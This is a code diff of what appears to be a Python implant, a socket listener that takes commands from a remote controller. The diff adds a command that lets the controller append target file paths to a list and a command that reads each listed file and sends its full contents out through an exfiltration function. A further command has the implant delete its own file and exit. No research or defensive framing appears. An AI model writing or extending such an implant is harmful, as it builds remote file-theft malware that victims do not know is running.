@@ -25,7 +25,7 @@ def recieve_command():
     try:
         #Recieves and prints the data
         while True:
-            data = connection.recv(100)
+            data = connection.recv(1500)
             if data:
                 return(data)
             
@@ -54,10 +54,24 @@ implant_socket.bind(implant_server_address)
 implant_socket.listen(1)
 
 while(True):
-    comm = recieve_command().decode("utf-8")
-    print("Recieved Command: ", comm)
+    command = recieve_command().decode("utf-8")
+    print("Recieved Command: ", command)
+    comm = command.split(";")[0]
 
-    if(comm == "2"):
+    #append to paths
+    if(comm == "2a"):
+        param = command.split(";")[1]
+        file1 = open('Paths.txt', 'r')
+        Lines = file1.readlines()
+        file1.close()
+        with open('Paths.txt', 'w') as f:
+            for line in Lines:
+                f.write(line)
+            f.write(param + "\n")
+            f.close()
+
+    #exfil paths
+    if(comm == "2e"):
         file1 = open('Paths.txt', 'r')
         Lines = file1.readlines()
         file1.close()
@@ -71,8 +85,13 @@ while(True):
 
         for line in Lines:
             #exfil the file for each location in Lines
-            send_exfil(str.encode(line))
-
+            cur_file = open(line.replace("\n", ""), 'r')
+            cur_file_lines = cur_file.readlines()
+            send_exfil(str.encode("------" + line.replace("\n", "") + "------\n"))
+            for c in cur_file_lines:
+                send_exfil(str.encode(c))
+            cur_file.close()
+            
         #attempt to close socket
         try:
             print("Closing Socket")
@@ -84,5 +103,5 @@ while(True):
 
     if(comm == "1"):
         remove(argv[0])
-        sys.exit(0)
+        exit()
         
